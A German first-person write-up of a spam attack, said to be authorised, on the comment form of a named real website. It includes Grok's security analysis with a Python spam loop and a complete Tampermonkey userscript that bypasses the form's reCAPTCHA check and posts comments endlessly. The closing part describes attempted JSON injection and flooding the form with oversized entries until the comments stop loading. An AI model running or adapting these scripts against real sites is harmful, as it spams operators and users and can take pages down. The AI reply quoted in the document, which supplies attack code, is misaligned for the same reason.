# Febel-Kommentar-Spam
ZUerst war mein Ziel die webseite mit bott kommentaren zu fluhten den darauf hatte ich am meisten lust. ich hatte auch die explizite Berechtigung dafür mit der Seite herumzuspielen.

Als erstes war es natürlich immer so der gehweg, die Erfassung von einem Kommentar zu automatisisieren, aber das Problem kam schnell hervor, dass diese seite mittels reCAPTCHA versehen war. Das ist so eine Schnittstelle die sich gegen bots kämpft in einer Eingabe.
Dies hatte auch mein Kollege so implementiert, nachdem er nach meiner Rückfrage gemerkt hat, dass sich mein Interesse mit seiner Webseite irgendetwas zu machen sehr cool engegenfand und ich mich daher seriös dem zuwidmen wollte.

Allerdings, als natürlich meine Automatisierung überhaupt nicht mehr aufging aufgrund des recaptchas war mir klar, ich musste noch tiefer grübeln.

Als ein typischer Hacker schaut man sich zunächst immer alles auf der Webseite an. Welche Informationen sehe ich, oder darf ich sehen, was kann ich mit diesen Informationen machen, oder welche erweiterte Schritte ich daraus potentiell durch diese Funktionalität ausnutzen könnte um etwas schlimmeres zu machen.

Also suchte ich überall was ich da so fand. Dabei waren folgende Links entscheidend für das herausfinden, was man nun damit überhaupt anfangen könne.
Es ging dabei um folgende Seite: https://febel.ch/Kommentare.html

Nur schon durch das durchschauen des View-Sources der Page fand ich schon folgende Informationen
view-source:https://febel.ch/Kommentare.html

https://febel.ch/getcomments.js
https://febel.ch/getcomments.php
https://febel.ch/script.js
https://www.google.com/recaptcha/api.js
https://www.google.com/recaptcha/api.js?render=6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt

Aber natürlich, wenn man kommentare erfasst, müssen sie ja auch irgendwo hinterlegt werden. Durch das capturen des Traffics von dieser Seite konnte ich diese Datei finden:
https://febel.ch/data.json

Und auch dort befanden sich alle Daten, von der aus die getcomments.js (ursprünglich vermutlich getcomments.php, da es dieses file nach einem kleinen update mit captcha nicht mehr gab) geholt werden.

Wenn man natürlich den Traffic analysierd währenddessen man einen neuen Eintrag speichert, dann sieht man das sich der traffic vom frontend aus von dieser Methode:
function validateForm(event) {
      var response = grecaptcha.getResponse();
      if (response.length === 0) {
        // verhindert das Absenden
        event.preventDefault();
        // Fehlermeldung direkt neben dem Widget anzeigen
        document.getElementById("captcha-error").style.display = "inline";
        return false;
      }
      return true;
    }

Zum captcha Teil sich begibt und danach zu diesem PHP Teil weitergeht:
https://febel.ch/save.php

Das ist der Punkt bei dem die Daten auf den Server treffen. Aber da ist natürlich das Problem, da sich dieses File beim Server befindet, kann man nicht in den Teil reinschauen und gucken was darin alles abgeht, weil dann könnte man schnell überlegen, was für weitere Möglichkeiten es gibt oder wie viele Mehr um dann vielleicht noch mehr schaden auf der Webseite anzurichten. Das einzige was natürlich möglich wäre, ist durch stetigem Herumtesten auf der Webseite, indem man immer wieder submited und schaut wie sich der server dadurch verhällt zu referse engineeren wie der Code im save.php ungefähr aussehen muss, anhand dessen was man alles durch das Testen vom Server Response teil aus alles erlebt.

Da die Automatisierung keinen Klang ins Geschehen einbrachte, musste ein anderer Weg einschlagen. Die Barriere war recaptche, also wie geht man den jetzt vor um gegen diese Barriere anzukämpfen? naja, es gibt ja immer wieder neuere Versionen davon die gemacht werden und warum würde man sie immer wieder updaten (selbst unter annahme es sei hoch sicher aufgrund vom Heilligen Konzerns namens "Google")? Man schaut was es so für schwachstellen gibt in dessen Der version, wenn man sie auch hat.

Aber durch die ganzen Files aus gesehen konnte man die Versionsnummer herausfinden, zumindest tat dies Grok. Um meine Arbeit nicht zu viel Zeit zu nehmen, habe ich alle Informationen mir zusammengesucht und sie dann an Grok weitergegeben:

## Frage an Grok
```
Ich habe eine Webseite programmiert, in die über ein Kontaktformular Kommentare eingegeben werden können. Diese werden in einer .JSON-Datei gespeichert und anschließend werden alle Einträge aus dieser Datei geholt und auf der Webseite angezeigt.
 
Ich habe folgende Details auf meiner Webseite für die User anzeigen lassen und frage mich, wie sicher das ist, denn ich möchte wissen, was alles möglich wäre, insbesondere was Spam angeht.
 
Das Formular enthält folgende Felder:

* input mit id="name" und name="name"

* input mit id="email" und type="email"

* textarea mit id="comment" und name="comment"

* ein verstecktes Feld für den reCAPTCHA-Token: input type="hidden" name="recaptcha_response" id="recaptchaResponse"

 
Dabei wird auch der gesamte Value des Captcha Widgets angezeigt: 0cAFcWeA6wIHBDcWjgkD8OPSgWGIMyBQZn1bubVruaXEJ78dSqL2lfwtLU51Nr8X9_ayXy5ntWiuYXUdjPKtuZar60fBm7po7Hl2XBIZhx4MMQW_U2hp0ReTkWTQHaZ_1co_gVl_HUwHiQEIM53EuzrMWO2wnzPpW-OVhuUYWeFwVEzemDCan-MeDdKzNxe5ysfvUcW-Nf4wUwD0JB4lDVFP6FxFXQ1lcAE6dwcccZs3mjIqcfsqlmy6XCPsYBA_kVayHhJl4fLYpwxO0owcuL_qkPewVflg1rUJCF2_CZp-m3A4mbBqHfKIAh9vg2SRWOvYQ1HHzwGWdOiBd3XzoHNGhm52QruTtKwcAmQTiwsyfXn6f_HhfKd94bCI5QPCSSZKfkUsvWoUmkPTdW2nujKxLcYwaZm4NYtYuz9v1lspN1Pwc8NPhFpCNz4Ng3XGtwUbyeUVx8KxFMm0DweqL825bDIZp9X121A_8EnwAC9BWNJOi-oCuT8c1-W7u_QNaGqpZQ0HGyQEXmQt95FoA3rzEp7T6VdxI1OUcVpapFOo4GJ_h1TnHoqxHEo60PO3tdkX9LZuINfiurM70QewSaKq7Fa50RRilHUDYh81Zr7XU4e0oS6_sgjM2-ccpT9en3iC616lneXvaUIbGaqKFik4sUMMP5YCDsGi3XhIgy011MsJTg0DnMjJD_lZSYPtfp9ruxSUHytbGYrdBfnTqGb3eQQCbUu2xc_H1ZxN8RSpsVuplGOb8Cc8VG_mFR4SaUHLBg9Gyon0sShiuF9a0VvdudXQ54DPjwjxGdUgK-mU9IrudGQ4HOXlTcgKcfYQjy279LDohGuEIFcCqFcbAbYesYD6f7UEfrpa0ZRAYmHLF5xF5dH2NL1JdEh35ofQ7nK9eyOoRWYaFhUQeleRrS97nRRCXopmL06ozvexZvc66qwH34CJYQDQqbvTDUfNx0MZGFLdmfEiYSjX4Ob70Lmp3tXJ_XdjqyxfF3mPR9velOpuYTnHwFnYLfWFC577lAQ4gZdflpDWPp4ommeGSCKiLnPnmwyxjIogcIFd4INDOXjXfy15oNnce0JvxkALWg9QE90ndDrcvBq-eSrIV7URNiQiIj4SZZ_8TPGikWUyNrdOintIew7TCraJ8qB-eBt-Fy5l4hOx4GWHE_7rg8zzqGkn9WSfBewGEvjE-gnicECaXoe39PhqNa8tLD3yf2jBd4xoOrJuxmSglhAIDCBnqPLx02SYMgr0uJQ6FIFqdxkezWu4sYsBhlqwRTUOFDJR9KQtH93RwZDYX4sMEvKgPFH6M8kmKaV2TQMsxlyVkig4LSJvV77TySakdH_5pyZfUw71o2W9ujllnekTB9McuPYJhioJTGcnEwJfbCrry2XwmC7BEfD5guGClyKwBq7-9Q1_qmRtgIlKoEJvY3L6YVp7HCHAE45Cll56cDRQ8JXNPwBDz6vwdS0jDMabH_AmAo7awVLMH0I0GFZ99yMDD_qSy48EvVuI-Rv8SGtG1yhi2-PE_n8hWBgx1PxYm8fpmJ5bHo30DAk6KmK_od2RSZ56Kzu_mcjC3vcgvPGqBTBpZnYVDVUm8bwc1T6IRLdLGkYmqzXIgy0so2Ivd_56lbGjg2vB125A
 
Wenn ich etwas nun submite, passiert folgendes:
 
<!DOCTYPE html><html lang="de"><head> <meta charset="UTF-8"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <script src="script.js" defer></script> <script src="getcomments.js" defer></script> <script src="https://www.google.com/recaptcha/api.js" async defer></script> <script> function validateForm(event) { var response = grecaptcha.getResponse(); if (response.length === 0) { // verhindert das Absenden event.preventDefault(); // Fehlermeldung direkt neben dem Widget anzeigen document.getElementById("captcha-error").style.display = "inline"; return false; } return true; } </script> <script src="https://www.google.com/recaptcha/api.js?render=6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt"></script><script> grecaptcha.ready(function() { grecaptcha.execute('6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt', {action: 'submit'}).then(function(token) { // Token ins Formular schreiben document.getElementById('recaptchaResponse').value = token; }); });</script></head><body><div class = "container"> <form action="save.php" method="post" onsubmit="return validateForm(event)"> <input id="name" name="name" placeholder="Ihr Name angeben" required/> <br> <input id="email" type="email" placeholder="Gebe deine Mail ein"/> <br> <textarea id="comment" name="comment" placeholder="Deine Verbesserungsvorschläge hier." required></textarea> <br> <!-- reCAPTCHA-Widget --> <input type="hidden" name="recaptcha_response" id="recaptchaResponse"> <span id="captcha-error" style="color:red; font-weight:bold; display:none;"> Bitte bestätigen! </span> <input type="submit" value="Senden"/> </form> <h2>Alle gespeicherten Einträge</h2> <div id="entries"></div> </div></body></html>
 
Das ist z.B. Kommentare.html.
 
Man kann auch den Inhalt von dem Captcha URL Link sehen:
https://www.google.com/recaptcha/api.js?render=6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt
 
Mit folgendem Inhalt: /* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function(){var w=window,C='___grecaptcha_cfg',cfg=w[C]=w[C]||{},N='grecaptcha';var gr=w[N]=w[N]||{};gr.ready=gr.ready||function(f){(cfg['fns']=cfg['fns']||[]).push(f);};w['__recaptcha_api']='https://www.google.com/recaptcha/api2/';(cfg['render']=cfg['render']||[]).push('6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt');(cfg['clr']=cfg['clr']||[]).push('true');(cfg['anchor-ms']=cfg['anchor-ms']||[]).push(20000);(cfg['execute-ms']=cfg['execute-ms']||[]).push(15000);w['__google_recaptcha_client']=true;var d=document,po=d.createElement('script');po.type='text/javascript';po.async=true; po.charset='utf-8';var v=w.navigator,m=d.createElement('meta');m.httpEquiv='origin-trial';m.content='A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==';if(v&&v.cookieDeprecationLabel){v.cookieDeprecationLabel.getValue().then(function(l){if(l!=='treatment_1.1'&&l!=='treatment_1.2'&&l!=='control_1.1'){d.head.prepend(m);}});}else{d.head.prepend(m);}po.src='https://www.gstatic.com/recaptcha/releases/TkacYOdEJbdB_JjX802TMer9/recaptcha__en.js';po.crossOrigin='anonymous';po.integrity='sha384-Ft89l3aihBBhSrkZ/Syx/7cCCaryQcJICINmdoWVHhaQefSnqabq/akNl06biiHi';var e=d.querySelector('script[nonce]'),n=e&&(e['nonce']||e.getAttribute('nonce'));if(n){po.setAttribute('nonce',n);}var s=d.getElementsByTagName('script')[0];s.parentNode.insertBefore(po, s);})();
 
Auch gibt es ein script.js:

```




// script.js

function injectStyles() {
  const head = document.head;
  const cssLinks = [
    "main.css",
    "https://fonts.googleapis.com/css?family=Dosis",
    "https://fonts.googleapis.com/css?family=Open+Sans"
  ];
  cssLinks.forEach(href => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = href;
    head.appendChild(link);
  });
}
  async function injectNav(container) {
    // Dateiname ermitteln
    const fileName = window.location.pathname.split("/").pop() || "Home.html";
    const title = fileName.replace(/\.[^/.]+$/, ""); // Endung weg
    h2 = document.createElement("h2");
    container.prepend(h2);
    h2.textContent = title;
    // 1) Daten laden
    const res = await fetch("nav.php");
    const navItems = await res.json();

    // 2) Kontext bestimmen
    const currentPage = window.location.pathname.split("/").pop() || "index.html";

    // 3) Header aufbauen
    const header = document.createElement("header");
    header.className = "header";

    const menuBtn = document.createElement("input");
    menuBtn.type = "checkbox";
    menuBtn.className = "menu-btn";
    menuBtn.id = "menu-btn";
    header.appendChild(menuBtn);

    const menuIcon = document.createElement("label");
    menuIcon.className = "menu-icon";
    menuIcon.setAttribute("for", "menu-btn");
    menuIcon.innerHTML = '<span class="navicon"></span>';
    header.appendChild(menuIcon);

    // 4) MenÃ¼-Liste rendern (map -> innerHTML)
    const ul = document.createElement("ul");
    ul.className = "menu";

    const itemsHtml = navItems.map(item => {
      const isActive = item.href.endsWith(currentPage);
      if (isActive) {
        return `<li><b><a class="yellow">${escapeHtml(item.label)}</a></b></li>`;
      } else {
        return `<li><a class="passif" href="${escapeAttr(item.href)}">${escapeHtml(item.label)}</a></li>`;
      }
    });

    ul.innerHTML = itemsHtml.join("");
    header.appendChild(ul);

    // 5) In den Container einfÃ¼gen
    container.prepend(header);
  }

  function escapeHtml(str) {
    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }
  function escapeAttr(str) {
    return String(str).replace(/"/g, "&quot;");
  }
  
function injectFooter(container) {
  const footer = document.createElement("footer");
  footer.innerHTML = `<p>Hosted by: Hetzner</p>`;
  container.appendChild(footer);
}

function initPage() {

  injectStyles();
  const container = document.querySelector(".container");
  if (container) {
    injectNav(container).catch(err => console.error("Nav-Fehler:", err));
    injectFooter(container);
  }
}

document.addEventListener("DOMContentLoaded", initPage);
```

und ein API.js:

```
/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function(){var w=window,C='___grecaptcha_cfg',cfg=w[C]=w[C]||{},N='grecaptcha';var gr=w[N]=w[N]||{};gr.ready=gr.ready||function(f){(cfg['fns']=cfg['fns']||[]).push(f);};w['__recaptcha_api']='https://www.google.com/recaptcha/api2/';(cfg['render']=cfg['render']||[]).push('onload');(cfg['clr']=cfg['clr']||[]).push('true');(cfg['anchor-ms']=cfg['anchor-ms']||[]).push(20000);(cfg['execute-ms']=cfg['execute-ms']||[]).push(15000);w['__google_recaptcha_client']=true;var d=document,po=d.createElement('script');po.type='text/javascript';po.async=true; po.charset='utf-8';var v=w.navigator,m=d.createElement('meta');m.httpEquiv='origin-trial';m.content='A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==';if(v&&v.cookieDeprecationLabel){v.cookieDeprecationLabel.getValue().then(function(l){if(l!=='treatment_1.1'&&l!=='treatment_1.2'&&l!=='control_1.1'){d.head.prepend(m);}});}else{d.head.prepend(m);}po.src='https://www.gstatic.com/recaptcha/releases/TkacYOdEJbdB_JjX802TMer9/recaptcha__en.js';po.crossOrigin='anonymous';po.integrity='sha384-Ft89l3aihBBhSrkZ/Syx/7cCCaryQcJICINmdoWVHhaQefSnqabq/akNl06biiHi';var e=d.querySelector('script[nonce]'),n=e&&(e['nonce']||e.getAttribute('nonce'));if(n){po.setAttribute('nonce',n);}var s=d.getElementsByTagName('script')[0];s.parentNode.insertBefore(po, s);})();

Und das ist die getcomments.js datei:
async function loadEntriesOld() {
  try {
    const response = await fetch("getcomments.php");
    const data = await response.json();

    const container = document.getElementById("entries");

    if (data.length === 0) {
      container.innerHTML = "<p>Noch keine EintrÃ¤ge vorhanden.</p>";
      return;
    }

    // map: jedes Objekt â†’ HTMLâ€‘String
    const html = data.map(entry => `
      <div class="entry">
        <div class="name">${escapeHtml(entry.name)}</div>
        <div class="time">${escapeHtml(entry.zeit)}</div>
        <div class="comment">${escapeHtml(entry.comment).replace(/\r\n|\r|\n/g, "<br>")}</div>
      </div>
    `).join("");

    container.innerHTML = html;
  } catch (err) {
    console.error("Fehler beim Laden:", err);
  }
}
async function loadEntriesOld2() {
  try {
    const response = await fetch("getcomments.php");
    if (!response.ok) {
      throw Error(response.statusText);
    }
    const data = await response.json();

    const container = document.getElementById("entries");

    if (data.length === 0) {
      container.innerHTML = "<p>Noch keine EintrÃ¤ge vorhanden.</p>";
      return;
    }

    // map: baue pro Eintrag ein Promise, das HTML zurÃ¼ckliefert
    const htmlPromises = data.map(async entry => {
      // hier kÃ¶nnte auch noch ein zusÃ¤tzlicher fetch stehen
      const html = `
        <div class="entry">
          <div class="name">${escapeHtml(entry.name)}</div>
          <div class="time">${escapeHtml(entry.zeit)}</div>
          <div class="comment">${escapeHtml(entry.comment).replace(/\r\n|\r|\n/g, "<br>")}</div>
        </div>
      `;
      return html;
    });

    // alle Promises parallel abwarten
    const results = await Promise.allSettled(htmlPromises);

    // zweites map: Ergebnisse sÃ¤ubern
    const cleaned = results.map(result => {
      if ("reason" in result) {
        return `<div class="error">Fehler: ${escapeHtml(result.reason.message)}</div>`;
      } else {
        return result.value;
      }
    });

    container.innerHTML = cleaned.join("");
  } catch (e) {
    console.error("Fehler beim Laden:", e);
    document.getElementById("entries").innerHTML = "<p>Fehler beim Laden.</p>";
  }
}


async function loadEntries() {
  try {
    const response = await fetch("getcomments.php");
    const data = await response.json();

    const container = document.getElementById("entries");

    if (data.length === 0) {
      container.innerHTML = "<p>Noch keine EintrÃ¤ge vorhanden.</p>";
      return;
    }

    // map mit async: jeder Eintrag wird parallel verarbeitet
    const promises = data.map(async entry => {
      // hier kÃ¶nnte auch ein weiterer fetch stehen
      const html = `
        <div class="entry">
          <div class="name">${escapeHtml(entry.name)}</div>
          <div class="time">${escapeHtml(entry.zeit)}</div>
          <div class="comment">${escapeHtml(entry.comment).replace(/\r\n|\r|\n/g, "<br>")}</div>
        </div>
      `;
      return html;
    });

    // alle Promises parallel abwarten
    const htmlBlocks = await Promise.all(promises);

    // zusammenfÃ¼gen
    container.innerHTML = htmlBlocks.join("");
  } catch (err) {
    console.error("Fehler beim Laden:", err);
  }
}
// kleine Hilfsfunktion zum Escapen
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

document.addEventListener("DOMContentLoaded", loadEntries);
```

Und unter getcomments.php werden alle Kommentare aus dem JSON File geholt:

```
[
  {
    "name": "Spam Bot #1",
    "comment": "Automatischer Test-Kommentar #1\r\nGesendet: 12/5/2025, 12:33:23 PM\r\nSkript läuft einwandfrei!",
    "zeit": "2025-12-05 12:33:24"
  },
  {
    "name": "Spam Bot #128",
    "comment": "Automatischer Test-Kommentar #128\r\nGesendet: 12/5/2025, 12:29:51 PM\r\nSkript läuft einwandfrei!",
    "zeit": "2025-12-05 12:29:52"
  },
  {
    "name": "Spam Bot #127",
    "comment": "Automatischer Test-Kommentar #127\r\nGesendet: 12/5/2025, 12:29:48 PM\r\nSkript läuft einwandfrei!",
    "zeit": "2025-12-05 12:29:49"
  },
  {
    "name": "Spam Bot #126",
    "comment": "Automatischer Test-Kommentar #126\r\nGesendet: 12/5/2025, 12:29:44 PM\r\nSkript läuft einwandfrei!",
    "zeit": "2025-12-05 12:29:46"
  },
```
```

## Antwort von Grok
```
Deine Seite ist leider **sehr unsicher** und wird aktuell bereits massiv von Spam-Bots missbraucht – das sieht man an den hunderten „Spam Bot #…“-Einträgen, die du schon hast.

Hier die wichtigsten Schwachstellen und was ein Angreifer aktuell alles machen kann:

### 1. reCAPTCHA v3 ist komplett umgangen (größtes Problem)
Du verwendest reCAPTCHA v3 (invisible) mit dem Site-Key  
`6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt`

Das ist ein **öffentlicher Site-Key** – jeder kann ihn sehen und benutzen.  
Die Bots machen genau das:

- Sie rufen selbst `grecaptcha.execute('6LcVpSEsA...vipvfJt', {action:'submit'})` auf (oder benutzen einen der vielen kostenlosen/paid reCAPTCHA-v3-Solver-Dienste, die für < 1 € pro 1000 Tokens lösen).
- Sie bekommen ein gültiges Token (wie das lange, das du im Quelltext gezeigt hast).
- Sie senden das Token zusammen mit Name + Comment direkt an dein `save.php`.

Du prüfst auf dem Server **nicht**, ob das Token echt ist!  
Das ist der entscheidende Fehler.

Bei reCAPTCHA v3 **muss** der Server das Token mit deinem **Secret Key** bei Google verifizieren. Wenn du das nicht machst, ist das Captcha komplett wirkungslos – genau das passiert bei dir gerade.

Aktuell können Bots pro Sekunde hunderte Kommentare posten, weil sie nur ein HTTP-POST an `save.php` mit einem gültigen Token machen müssen.

### 2. Keine serverseitige Validierung / Sanitization
Selbst wenn das Captcha irgendwann funktionieren würde, hast du weitere Probleme:

- Keine Prüfung auf maximale Länge von Name/Comment → DoS durch riesige JSON-Datei möglich
- Kein Rate-Limiting (pro IP, pro Minute)
- Kein Honeypot-Feld
- Kein CSRF-Token
- Keine Blockierung bekannter Spam-Wörter/Domains

### 3. JSON-Datei als „Datenbank“ = katastrophal bei Spam
Jeder neue Kommentar wird einfach angehängt → Datei wird immer größer → irgendwann > 100 MB → PHP kann sie nicht mehr lesen/schreiben → Seite tot oder extrem langsam.

Außerdem kann ein Angreifer durch gleichzeitiges Schreiben (race condition) die Datei zerstören.

### 4. XSS ist aktuell nicht möglich (gut gemacht!)
Du escapst mit `escapeHtml()` überall korrekt → kein gespeichertes XSS. Das ist einer der wenigen Punkte, die du richtig gemacht hast.

### Was die Bots gerade machen (100 % sicher)
Sie benutzen Skripte à la:

```python
import requests, time
site_key = "6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt"
url = "https://deine-domain.de/save.php"

for i in range(10000):
    # Token holen (selbst lösen oder über 2captcha/anti-captcha etc.)
    token = get_recaptcha_v3_token(site_key, url)
    
    requests.post(url, data={
        "name": f"Spam Bot #{i}",
        "comment": f"Automatischer Spam #{i} – deine Seite ist offen!",
        "recaptcha_response": token
    })
    time.sleep(0.5)
```

Das erklärt deine Spam Bot #1 bis #128+ Einträge in wenigen Minuten.

### Was du SOFORT machen musst (Prioritätenreihenfolge)

1. **Server-seitige reCAPTCHA-Verifizierung einbauen** (das stoppt 99 % des Spams sofort)

In `save.php` muss ungefähr das stehen:

```php
<?php
$secret = "6LcVpSEsAAAAA................................"; // DEIN SECRET KEY!!!
$recaptcha_response = $_POST['recaptcha_response'] ?? '';

if (!$recaptcha_response) die("No token");

$verify = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".urlencode($secret)."&response=".urlencode($recaptcha_response));
$response = json_decode($verify);

if (!$response->success || $response->score < 0.5 || $response->action !== 'submit') {
    http_response_code(403);
    die("reCAPTCHA failed (Score: ".($response->score ?? 'none').")");
}
?>
```

Ohne diesen Check ist alles andere sinnlos.

2. Secret Key niemals im Frontend zeigen!! (du hast ihn hoffentlich nicht)

3. Rate-Limiting einbauen (z. B. max. 3 Kommentare pro IP pro Stunde)

4. Auf echte Datenbank umsteigen (SQLite reicht völlig) oder zumindest File-Locking + Größenlimit

5. Honeypot-Feld hinzufügen (unsichtbares Feld, das echte User nicht ausfüllen)

6. Optional: Kommentare erst nach Freigabe anzeigen (Admin-Moderation)

### Fazit
Aktueller Sicherheitsstand: ≈ 5 von 100  
Mit serverseitiger reCAPTCHA-Verifizierung + Rate-Limit: ≈ 85–90 von 100 (für eine einfache Kommentarseite völlig ausreichend).

Tu als Allererstes Punkt 1 – dann hört der Spam innerhalb von Minuten auf.

Wenn du willst, schreibe ich dir den kompletten korrigierten `save.php` + ein paar zusätzliche Schutzmaßnahmen. Sag einfach Bescheid!
```
```

Durch diese Art und Weise kann man sich extrem viel Zeit sparen.

Es hat sehr lange funktioniert, nur klappte es leider nicht ganz immer, da mein Lieber Herr, also der Webseitenbetreiber dann einmal ein Update gemacht hat welches die reCaptcha Schnittstelle abgesichert hat. Also was habe ich geamcht? Wenn mein Ziel es schon war möglichst viele Einträge in die Kommentar spalte einzufügen brauche ich doch wohl einen voll automatisisierten Ansatz.

Über Tempermonkey habe ich mir dann folgendes Skript ableiten lassen:
```javascript
// ==UserScript==
// @name         Auto-Spammer für https://febel.ch/Kommentare.html
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Endlos spammen + reCAPTCHA v3 Bypass – läuft nach jedem Reload
// @author       Du
// @match        https://febel.ch/Kommentare.html
// @match        https://febel.ch/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    console.log("%c=== SPAMMER SKRIPT GESTARTET ===", "color: blue; font-size: 16px");

    if (window.spammerAlreadyRunning) {
        console.log("Skript läuft bereits – skip");
        return;
    }
    window.spammerAlreadyRunning = true;

    let count = localStorage.getItem('spamCount') || 0; // Zähler persistent machen
    count = parseInt(count) + 1;
    localStorage.setItem('spamCount', count);

    function spamOnce() {
        console.log("spamOnce() aufgerufen...");

        // Warte auf Formular
        const nameField = document.getElementById("name");
        if (!nameField) {
            console.log("Formular noch nicht geladen – warte 1 Sek...");
            setTimeout(spamOnce, 1000);
            return;
        }
        console.log("Formular gefunden – starte Spam!");

        // Validation deaktivieren
        if (typeof validateForm === "function") {
            window.validateForm = function () { return true; };
            console.log("validateForm deaktiviert");
        }
        const errorSpan = document.getElementById("captcha-error");
        if (errorSpan) {
            errorSpan.style.display = "none";
            console.log("Fehler-Element versteckt");
        }

        // reCAPTCHA Token erneuern
        if (typeof grecaptcha !== "undefined" && grecaptcha.execute) {
            console.log("reCAPTCHA v3 Token erneuern...");
            grecaptcha.execute('6LcVpSEsAAAAAGhyaqUbIWbxN_YhhnR67vipvfJt', { action: 'submit' })
                .then(function (token) {
                    const tokenField = document.getElementById('recaptchaResponse');
                    if (tokenField) {
                        tokenField.value = token;
                        console.log("Token erfolgreich eingetragen");
                    } else {
                        console.error("Token-Feld nicht gefunden!");
                    }
                }).catch(function(err) {
                    console.error("reCAPTCHA Fehler:", err);
                });
        } else {
            console.warn("grecaptcha nicht geladen – warte...");
            setTimeout(spamOnce, 2000);
            return;
        }

        // Felder füllen & absenden
        setTimeout(function () {
            console.log("Felder werden gefüllt...");
            nameField.value = "Spam Bot #" + count;
            document.getElementById("email").value = "spam" + count + "@febel.ch";
            document.getElementById("comment").value =
                "Automatischer Test-Kommentar #" + count + "\n" +
                "Gesendet: " + new Date().toLocaleString() + "\n" +
                "Skript läuft einwandfrei!";

            // Events triggern
            const fields = ["name", "email", "comment"];
            for (let i = 0; i < fields.length; i++) {
                const el = document.getElementById(fields[i]);
                if (el) {
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }

            // Absenden
            const submitBtn = document.querySelector('input[type="submit"]');
            if (submitBtn) {
                submitBtn.click();
                console.log("%c=== EINTRAG #" + count + " ABGESC HICKT ===", "color: green; font-size: 14px");
            } else {
                console.error("Submit-Button nicht gefunden!");
            }
        }, 2000); // Warte auf Token
    }

    // Start
    console.log("Warte auf DOM...");
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", function() {
            console.log("DOM loaded – starte Spam");
            spamOnce();
        });
    } else {
        spamOnce();
    }

    // Nach Reload/Änderung neu starten (alle 5 Sek checken)
    setInterval(function() {
        if (document.getElementById("name")) {
            spamOnce();
        }
    }, 5000); // 5000

    console.log("%cSkript aktiv – checke die Logs!", "color: blue; font-size: 16px");
})();
```

Dies hat eben wie schon vorab erwähnt extrem gut vollautomatisiert funktioniert. Doch leider irgendwann wurde ich dann immer wieder schneller als Bot von reCaptcha erkannt und daher musste dann irgendwann eine neue Lösung sich heranwachsen lassen. Zusätzlich erschwerte mir der Webseiten betreiber aufgrund von dem was er bis jetzt gesehen hat, was ich gemacht habe, hat er dann auf der Webseite die Einträge aus dem .JSON File sortiert anhand der ältesten Einträge, sodass ich, wenn ich immer einen neuen versucht hatte zu botten, wurde er nie mehr auf der Webseite angezeigt.

Für die ganzen Automatisierungen mittels Python musste ich mich mit Chromedriver vertraut machen: https://googlechromelabs.github.io/chrome-for-testing/#stable

Nun, was kann man den jetzt machen? Ich kann endlos viele Einträge erstellen, aber sie werden nicht mehr auf der Webseite sichtbar. Also was habe ich mir dann überlegt?

Wie kann ich im Input die Eingabe so manipulieren, um die JSON Verarbeitung so zu manipulieren, damit es das Datum verändert in ein älteres datum? Hat leider nicht funktioniert, da man bei der Eingabe, die Zeit automatisch schon erfasst wurde und hatte man versucht irgendwie dazwischen zu funken bei der verarbeitung, fing reCaptcha an zu schreien und drehte mir den Hanen ab.

Auch beim Versuch mit JSON-Injection also mittels, dass ich versuchen könnte mit JavaScript code während der Erfassung einen bereits bestehenden Eintrag zu verändern um dessen Zeit in die Vergangenheit zu treiben, hat leider nicht funktioniert, da das Frontend reverse Engineered also die Backend Verarbeitung Werte in das JSON FIle hinzufügt, und es keine Möglichkeit gibt es zu Bearbeiten oder gar zu löschen.

Also wenn man von all dem nichts mehr machen kann, aber man dennoch einen an sich durchaus bemerkbaren Schaden anrichten will, dann schaut man wie viele Einträge man pro Mal erfassen kann und durch diverser Stellte sich dabei heraus, dass man beim textarea Feld beliebig viele Eingaben tätigen kann. Und das war auch schlussement der umkehrschluss dafür -> möglichst viele Einträge in das JSON FIle speichern -> sodass das Frontend extrem viel Zeit braucht die EInträge anzuzeigen -> und wenn es zu viele waren -> dann werden einfach gar keine Mehr angezeigt. Und dies war auch für mich der berücktigte Gehweg den ich für mein Ziel hatte.

